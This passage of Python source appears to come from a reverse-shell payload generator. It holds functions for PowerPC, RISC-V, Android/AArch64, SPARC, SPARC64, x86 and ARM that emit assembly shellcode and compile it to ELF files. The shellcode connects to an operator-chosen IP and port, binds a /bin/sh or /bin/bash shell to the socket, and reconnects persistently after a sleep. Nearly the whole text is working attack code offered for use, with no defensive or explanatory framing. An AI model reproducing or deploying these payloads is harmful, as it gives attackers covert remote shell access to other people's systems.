ori    9, 9, 24947
stw    9, 52(31)
lis    9, 0x6800
ori    9, 9, 0
stw    9, 56(31)
lis    9, 0x2d69
stw    9, 60(31)
addi   3, 31,0x30
stwu   3, 0(31)
addi   11, 31,60
stwu   11, 4(31)
addi   4, 31, -4
xor    5, 5, 5
li     0, 0xb
sc
		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)


	shellcode += '''
xor 3,3,3
li  0,0xea
sc
main_lab:
mr  3, 11
xor 4,4,4
xor 5,5,5
xor 6,6,6
li  0,0x72
sc
'''
	sleep_time = int(sleep_time,16)
	sleep_time_high = sleep_time>>16 &0xffff
	sleep_time_low = sleep_time & 0xffff
	shellcode += """
mr 31, 1
li 0, 0xa2
xor  3,3,3
subi 31, 31, 4
stw  3, 0(31)
lis r3, {time_high}
ori r3, r3, {time_low}
subi 31, 31, 4
stw  3, 0(31)
mr  3, 31
sc
""".format(time_high=sleep_time_high,time_low = sleep_time_low)

	shellcode +='''
b _start
nop
	'''

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode,filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def powerpcle_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'powerpc'
	context.endian = 'little'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip = reverse_ip.split('.')
	handle_ip_0="0x"+enhex(p8(int(reverse_ip[0])))
	handle_ip_1="0x"+enhex(p8(int(reverse_ip[1])))
	handle_ip_2="0x"+enhex(p8(int(reverse_ip[2])))
	handle_ip_3="0x"+enhex(p8(int(reverse_ip[3])))
	handle_port_1 = p16(reverse_port)[0]
	handle_port_2 = p16(reverse_port)[1]
	shellcode ='''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	'''
	'''
	powerpc fork num 0x000078
	powerpc wait4 num 0x000072
	powerpc exit  num 0x0000ea
	mr     r9, r3
	cmpwi  cr7, r9, 0
	'''
	shellcode += '''
lis 3, 288
ori 3, 3, 17
xor 4, 4, 4
li  0, 0x78
sc
mr  11, 3
cmpwi cr7, 11, 0
bne   cr7, main_lab
	'''
	shellcode += '''
	mr    r31,r1
	li    r3,2
	li    r4,1
	li    r5,0
	li    r0,0x146
	sc
	mr    r17,r3
	xor   r9,r9,r9
	stw   r9, 28(r31)
	stw   r9, 32(r31)
	stw   r9, 36(r31)
	stw   r9, 36(r31)
	stw   r9, 40(r31)
	stw   r9, 44(r31)
	stw   r9, 48(r31)
	stw   r9, 52(r31)
	stw   r9, 56(r31)
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 2
	sth   r9, 28(r31)
	li    r9, %s
	stb   r9, 30(r31)
	li    r9, %s
	stb   r9, 31(r31)
	li    r9, %s
	stb   r9, 32(r31)
	li    r9, %s
	stb   r9, 33(r31)
	li    r9, %s
	stb   r9, 34(r31)
	li    r9, %s
	stb   r9, 35(r31)
	addi   r4, r31, 0x1c
	mr    r3, r17
	li    r5, 0x10
	li    r0, 0x148
	sc
	xor   r5, r5, r5
	mr    r3,r17
	li    r4,0
	li    r0,0x3f
	sc
	mr    r3,r17
	li    r4,1
	sc
	mr    r3,r17
	li    r4,2
	sc
	'''
	shellcode = shellcode % (handle_port_2,handle_port_1, handle_ip_0, handle_ip_2, handle_ip_2, handle_ip_3)

	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode += '''
		lis    r9, 0x6e69
		ori    r9, r9, 0x622f
		stw   r9, 48(r31)
		xor  r9, r9, r9
		lis    r9, 0x68
		ori   r9, r9, 0x732f
		stw   r9, 52(r31)
		addi  r3, r31,0x30
		stwu  r3, 0(r31)
		xor   r5, r5, r5
		stw   r5, 64(r31)
		lis   r9, 0x692d
		stw   r9, 60(r31)
		addi  r11, r31,62
		addi  r4, r31, -4
		xor   r5, r5, r5
		li    r0, 0xb
		sc
		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += '''
		lis    r9, 0x6e69
		ori    r9, r9, 0x622f
		stw   r9, 48(r31)
		xor  r9, r9, r9
		lis    r9, 0x7361
		ori   r9, r9, 0x622f
		stw   r9, 52(r31)
		lis    9, 0
		ori   r9, r9, 0x68
		stw    9, 56(31)
		addi  r3, r31,0x30
		stwu  r3, 0(r31)
		xor   r5, r5, r5
		stw   r5, 64(r31)
		lis   r9, 0x692d
		stw   r9, 60(r31)
		addi  r11, r31,62
		stwu  r11, 4(r31)
		addi  r4, r31, -4
		li    r0, 0xb
		sc
		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode += '''
xor 3,3,3
li  0,0xea
sc
main_lab:
mr  3, 11
xor 4,4,4
xor 5,5,5
xor 6,6,6
li  0,0x72
sc
'''
	sleep_time = int(sleep_time,16)
	sleep_time_high = sleep_time>>16 &0xffff
	sleep_time_low = sleep_time & 0xffff
	shellcode += """
mr 31, 1
li 0, 0xa2
xor  3,3,3
subi 31, 31, 4
stw  3, 0(31)
lis r3, {time_high}
ori r3, r3, {time_low}
subi 31, 31, 4
stw  3, 0(31)
mr  3, 31
sc
""".format(time_high=sleep_time_high,time_low = sleep_time_low)

	shellcode += '''
b _start
nop
	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode,filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

'''
add 2023.1.14
riscv64 power 

Android power
'''

def riscv64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'riscv'
	context.endian = 'little'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip=reverse_ip.split(".")[::-1]
	reverse_ip_new='0x'
	for i in  range(4):
		reverse_ip_new+=enhex(p8(int(reverse_ip[i])))
	reverse_port=enhex(p16(reverse_port))+"0002"
	all_reverse_infor=reverse_ip_new+reverse_port
	'''
	0xdc fork
	'''

	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
li a0,0x1200011
li a2,0
li a1,0
li a7,0xdc
ecall
mv s7,a0
sext.w s7, s7
bnez   s7, main_lab
	'''
	shellcode_connect='''
li a0,2
li a1,1
li a2,0
li a7,0xc6
ecall
mv a6,a0
li s1,%s
sd s1,-16(sp)
add a1,sp,-16
li a2,16
li a7,0xcb
ecall
	'''
	shellcode_connect=shellcode_connect%(all_reverse_infor)

	shellcode += shellcode_connect
	shellcode +='''
mv a0,a6
li a1,0
li a2,0
li a7,0x18
ecall
mv a0,a6
add a1,a1,1
ecall
mv a0,a6
add a1,a1,1
ecall
	'''
	
	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode += '''
li s1, 0x68732f2f6e69622f
sd s1, -16(sp)
sd zero, -8(sp)
addi a0,sp,-16
sd a0, -32(sp)
addi a1,sp,-32
slt a2,zero,-1 
li a7, 221
ecall
		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += '''
li s1, 0x687361622f6e6962
sd s1, -16(sp)
li s1, 0x2f00000000000000
sd s1, -24(sp)
li s1, 0x692d
sd s1, -32(sp)
sd zero, -8(sp)
addi a0,sp,-17
sd a0, -64(sp)
addi a5,sp,-32
sd a5, -56(sp)
add a1,sp,-64
slt a2,zero,-1
li a7, 221
ecall
		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	'''
	exit 0x5e
	wait4 0x104
	'''
	shellcode += '''
li a0, 0 
li a7, 0x53
ecall
main_lab:
mv a0,s7
li a1,0
li a2,0
li a3,0
li a7,0x104
ecall
j _start
	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode,filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def android_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'aarch64'
	context.endian = 'little'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	if shell_path == "/bin/bash" or shell_path == "bash":
		shellcode_execve = '''
/* execve(path='/bin/bash', argv=['/bin/bash', '-i'], envp=0) */
/* push b'/bin/bash\x00' */
/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #25135, lsl #0x20
movk x14, #29537, lsl #0x30
mov  x15, #104
stp x14, x15, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/bash\x00', b'-i\x00'] */
/* push b'/bin/bash\x00-i\x00' */
/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #25135, lsl #0x20
movk x14, #29537, lsl #0x30
/* Set x15 = 1764556904 = 0x692d0068 */
mov  x15, #104
movk x15, #26925, lsl #16
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #18
add x14, sp, x14
sub sp, sp ,8
str x14, [sp, #-8]!
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
stp x5, x14 , [sp, #-8]!

add x1, sp, 8

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

		'''
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shellcode_execve ='''
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
str x14, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
/* push b'/bin/sh\x00-i\x00' */
/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
mov  x15, #26925
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
str x14, [sp, #0]! /* b'-i\x00' */

mov x1, sp

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)


	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	'''
	
	shellcode += shellcraft.clone(0x1200011)

	shellcode += '''
mov x11, x0
cmp w0, #0
b.ne main_lab
	'''

	shellcode += shellcraft.connect(reverse_ip, reverse_port)

	shellcode += '''
mov x0,x12
mov x1,#0
mov x2,#0
mov x8,#0x18
svc #0x1337
mov x0,x12
mov x1,#1
svc #1337
mov x0,x12
mov x1,#2
svc #1337
	'''
	shellcode += shellcode_execve

	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("x11")


	shellcode += """
LDR X12, ={time}
eor x11, x11, x11
str x11, [sp, #-8]!
str x12, [sp, #-8]!
mov x0, sp
mov  x8, #0x65
svc 0
	""".format(time=sleep_time)

	shellcode += '''
b __start
nop
	'''

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

'''
2023.1.1.5

sparc_power_reverse
sparc64_power

'''


def sparc_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'sparc'
	context.endian = 'big'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip = reverse_ip.split('.')
	reverse_ip_1 = "0x"+enhex(p8(int(reverse_ip[0])))
	reverse_ip_2 = "0x"+enhex(p8(int(reverse_ip[1])))
	reverse_ip_3 = "0x"+enhex(p8(int(reverse_ip[2])))
	reverse_ip_4 = "0x"+enhex(p8(int(reverse_ip[3])))
	handle_port = hex(p16(reverse_port)[0])
	handle_port_1 = hex(p16(reverse_port)[1])
	
	'''0x1200014
	0xd9 clone
	7    wait4
	0xBC exit
 	'''
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
set 0x1200014, %o0
mov 0, %o1
mov 0, %o2
mov 0, %o3
mov 0xd9, %g1
ta  0x10
mov %o0, %o7
cmp %o0, 0
bne main_lab
 '''
	shellcode += '''
mov  0, %o2
mov  1, %o1
mov  2, %o0
save %sp, -0x70, %sp
mov  1, %o0
st   %i0, [%fp+-0xc]
add  %fp, -0xc, %o1
st   %i1, [%fp+-8]
mov  0xce, %g1
ta   0x10
mov  %o0, %l0
mov  {} , %g1 
stb   %g1 , [%sp + 4 ]
mov  {},  %g1
stb   %g1 , [%sp + 5 ]
mov  {},  %g1
stb   %g1 , [%sp + 6 ]
mov  {},  %g1
stb   %g1 , [%sp + 7 ]
mov  0 ,  %g1
stb  %g1,   [%sp]
mov  2,   %g1
stb  %g1,   [%sp+1]
mov   {}, %g1
stb   %g1,  [%sp + 2]
mov   {}, %g1
stb   %g1,  [%sp + 3]
mov  0x10, %g1
st   %g1, [%sp + -8 ]
st   %sp,  [%sp + -12]
st   %o0,  [%sp + -16]
mov  3,  %o0
add  %sp, -16, %o1
mov  0,   %o2
mov  0xce, %g1
ta   0x10
mov  %l0, %o0
mov  0,  %o1
mov  0x5a, %g1
ta   0x10
mov  %l0, %o0
mov  1,  %o1
mov  0x5a, %g1
ta   0x10
mov  %l0, %o0
mov  2,  %o1
mov  0x5a, %g1
ta   0x10
    '''
	if (shell_path == "/bin/sh" or shell_path == "sh"):
		shellcode += '''
sethi  0xbd89a, %g2
or     %g2, 0x16e, %g2
sethi  %hi(0x2f736800), %g3
st     %g2, [%sp + 0x20]
st   %g3, [%sp + 0x24]
mov  0,  %g3
add  %sp, 0x20, %g1
mov  %g1, %o0
st   %g1, [%sp]
st   %g3, [%sp +4]
mov  %sp, %o1
mov  %g3, %o2
mov  0x3b, %g1
ta   0x10
        '''
    
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += '''
set  0x2F62696E, %g2
set  0x2F626173, %g3
st   %g2, [%sp + 0x20]
st   %g3, [%sp + 0x24]
mov  0x68, %g1
stb  %g1, [%sp + 0x28]
set  0x2d69 , %g2
st   %g2, [%sp + 0x30]
mov  0,  %g3
add  %sp, 0x20, %g1
mov  %g1, %o0
st   %g1, [%sp]
add  %sp, 0x32, %g1
st   %g1,  [%sp +4]
st   %g3, [%sp +8]
mov  %sp, %o1
mov  %g3, %o2
mov  0x3b, %g1
ta   0x10
        '''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)

	shellcode = shellcode.format(reverse_ip_1, reverse_ip_2, reverse_ip_3, reverse_ip_4, handle_port, handle_port_1)
	
	shellcode += '''
mov 0, %o0
mov 0xbc, %g1
ta 0x10
main_lab:
mov %o7,%o0
mov 0, %o1
mov 0, %o2
mov 0, %o3
mov 7, %g1
ta  0x10
mov 1, %o0
cmp %o0, 0
bne _start
nop
 '''
 
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

def sparc64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'sparc64'
	context.endian = 'big'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip = reverse_ip.split('.')
	reverse_ip_1 = "0x"+enhex(p8(int(reverse_ip[0])))
	reverse_ip_2 = "0x"+enhex(p8(int(reverse_ip[1])))
	reverse_ip_3 = "0x"+enhex(p8(int(reverse_ip[2])))
	reverse_ip_4 = "0x"+enhex(p8(int(reverse_ip[3])))
	handle_port = hex(p16(reverse_port)[0])
	handle_port_1 = hex(p16(reverse_port)[1])
	'''
	sethi   0x1200000, %o0
	0xD9 fork
	'''
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
set 0x1200014, %o0
mov 0, %o1
mov 0, %o2
mov 0, %o3
mov 0xd9, %g1
ta  0x10
mov %o0, %o7
cmp %o0, 0
bne main_lab
 '''
	shellcode += '''
mov  0, %o2
mov  1, %o1
mov  2, %o0
save   %sp,  -208,  %sp
stx    %g1,  [ %fp + 0x7f7 ]
clr    %g1
mov    1,  %o0
stx    %i0,  [ %fp + 0x7df ]
stx    %i1,  [ %fp + 0x7e7 ]
stx    %i2,  [ %fp + 0x7ef ]
add    %fp,  0x7df,  %o1
mov  0xce, %g1
ta   0x10
mov  %o0, %l0
mov  {} , %g1 
stb   %g1 , [%sp + 4 ]
mov  {},  %g1
stb   %g1 , [%sp + 5 ]
mov  {},  %g1
stb   %g1 , [%sp + 6 ]
mov  {},  %g1
stb   %g1 , [%sp + 7 ]
mov  0 ,  %g1
stb  %g1,   [%sp]
mov  2,   %g1
stb  %g1,   [%sp+1]
mov   {}, %g1
stb   %g1,  [%sp + 2]
mov   {}, %g1
stb   %g1,  [%sp + 3]
mov  %sp, %o1
mov  0x10,%o2
mov  0x62,%g1
ta   0x10
mov  %l0, %o0
mov  0,  %o1
mov  0x5a, %g1
ta   0x10
mov  %l0, %o0
mov  1,  %o1
mov  0x5a, %g1
ta   0x10
mov  %l0, %o0
mov  2,  %o1
mov  0x5a, %g1
ta   0x10
    '''
	if (shell_path == "/bin/sh" or shell_path == "sh"):
		shellcode += '''
sethi  0xbd89a, %g2
or     %g2, 0x16e, %g2
sethi  %hi(0x2f736800), %g3
st     %g2, [%sp + 0x20]
st   %g3, [%sp + 0x24]
mov  0,  %g3
add  %sp, 0x20, %g1
mov  %g1, %o0
stx   %g1, [%sp]
stx   %g3, [%sp +8]
mov  %sp, %o1
mov  %g3, %o2
mov  0x3b, %g1
ta   0x10
        '''
    
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += '''
set  0x2F62696E, %g2
set  0x2F626173, %g3
st   %g2, [%sp + 0x20]
st   %g3, [%sp + 0x24]
mov  0x68, %g1
stb  %g1, [%sp + 0x28]
set  0x2d69 , %g2
st   %g2, [%sp + 0x30]
mov  0,  %g3
add  %sp, 0x20, %g1
mov  %g1, %o0
stx   %g1, [%sp]
add  %sp, 0x32, %g1
stx   %g1,  [%sp +8]
stx   %g3, [%sp +16]
mov  %sp, %o1
mov  %g3, %o2
mov  0x3b, %g1
ta   0x10
        '''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)

	shellcode = shellcode.format(reverse_ip_1, reverse_ip_2, reverse_ip_3, reverse_ip_4, handle_port, handle_port_1)
	
	shellcode += '''
mov 0, %o0
mov 0xbc, %g1
ta 0x10
main_lab:
mov %o7,%o0
mov 0, %o1
mov 0, %o2
mov 0, %o3
mov 7, %g1
ta  0x10
mov 1, %o0
cmp %o0, 0
bne _start
nop
 '''
 
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



def x86_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'i386'
	context.endian = 'little'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		#shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode ='''
.section .shellcode,"awx"
.global _start
.global __start
_start:
__start:
.intel_syntax noprefix
_start:
	'''
	shellcode += shellcraft.fork()
	shellcode += '''
	cmp eax,0
	jnz main_lab
	'''
	shellcode += shellcraft.connect(reverse_ip, reverse_port)
	shellcode += shellcraft.dup2("edx",0)+shellcraft.dup2("edx",1)+shellcraft.dup2("edx",2)
	shellcode += shellcraft.execve(shell_path,shell_path_list, envp )
	shellcode += shellcraft.exit(0)
	shellcode += '''
main_lab:
	push 0x72
	pop eax
	xor ebx,ebx
	int 0x80
	push 0x0
	push {time}
	mov  ebx, esp
	mov eax, 162
	int 0x80
	jmp _start
	'''.format(time=sleep_time)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



def armelv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.bits="32"
	context.arch='arm'
	context.endian='little'
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shellcode='''
	.section .shellcode,"awx"
	.global _start
	.global __start
	.p2align 2
	_start:
	__start:
	.syntax unified
	.arch armv7-a
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x2b]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x61
	strb r7,[sp,#-0x17]
	mov r7,#0x62
	strb r7,[sp,#-0x18]
	mov r7,#0x2f
	strb r7,[sp,#-0x19]
	mov r7,#0x6e
	strb r7,[sp,#-0x1a]
	mov r7,#0x69
	strb r7,[sp,#-0x1b]
	mov r7,#0x62
	strb r7,[sp,#-0x1c]
	mov r7,#0x2f
	strb r7,[sp,#-0x1d]
	eor r7, r7
	strb r7,[sp,#-0x1e]
	mov r7,#0x69
	strb r7,[sp,#-0x1f]
	mov r7,#0x2d
	strb r7,[sp,#-0x20]
	add r4,sp,#-0x1d
	add r5,sp,#-0x2c
	add r8,sp,#-0x20
	main:
	'''

		shellcode += """
	mov     r7, #2
	svc     0x900002

		"""

		shellcode += '''
	mov r3,r0
	cmp r3,#0
	bne main_lab
	'''

		shellcode +='''
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc 0x900119
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc 0x90011b
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc 0x90003f
	mov r0,r6
	add r1,r1,#1
	svc 0x90003f
	mov r0,r6
	add r1,r1,#1
	svc 0x90003f
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r1}
	push {r0,r8}
	mov r1,sp
	mov r7,#0xb
	svc 0x90000b

	'''

		shellcode += """
	eor     r0, r0, r0
	mov     r7, #1
	svc     0x900000
		"""

		shellcode += '''
main_lab:
	'''

		shellcode += """
mov     r0, r3
eor     r1, r1, r1
eor     r2, r2, r2
eor     r3, r3, r3
mov     r7, #114
svc     0x900072

		"""

		shellcode += """
ldr r10, ={time}
eor r5, r5
push {{r5}}
push {{r10}}
mov r0, sp
mov r7, 0xa2
svc 0x9000a2
pop {{r5,r10}}
	""".format(time=sleep_time)

		shellcode += '''
b _start
nop
	'''
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shellcode='''
	.section .shellcode,"awx"
	.global _start
	.global __start
	.p2align 2
	_start:
	__start:
	.syntax unified
	.arch armv7-a
	.ARM
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x2b]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	mov r7,#0x69
	strb r7,[sp,#-0x1f]
	mov r7,#0x2d
	strb r7,[sp,#-0x20]
	add r4,sp,#-0x1b
